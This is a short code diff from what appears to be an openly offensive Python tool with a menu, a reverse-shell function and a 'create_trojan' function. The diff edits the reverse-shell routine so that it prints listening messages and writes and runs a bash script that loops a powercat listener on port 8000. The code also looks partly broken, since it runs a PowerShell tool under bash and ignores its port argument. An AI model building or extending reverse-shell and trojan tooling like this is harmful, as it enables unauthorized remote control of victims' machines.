@@ -333,13 +333,14 @@ def menu():
               
 
 def reverseshell(lhost, lport):
-    print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Starting Listening...")
-    time.sleep(5)
-    print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Started!!!")
     time.sleep(1)
-    os.system('clear')
+    print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Starting Listening on {lhost}...")
+    time.sleep(5)
+    print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Listening started on {lhost}")
+    time.sleep(2)
+    print(f"{Fore.BLUE}{blod1}[*]{Fore.WHITE}{blod2} Waiting connection on {lhost}...\n")
     with open("reverseshell.sh", "w") as f:
-        f.write(f"while true; do powercat -l -p 8000 ; done")
+        f.write(f"while true; do powercat -l -p 8000 2> /root/error.txt ; done")
     subprocess.run(["bash", "reverseshell.sh"])
 
 def create_trojan():
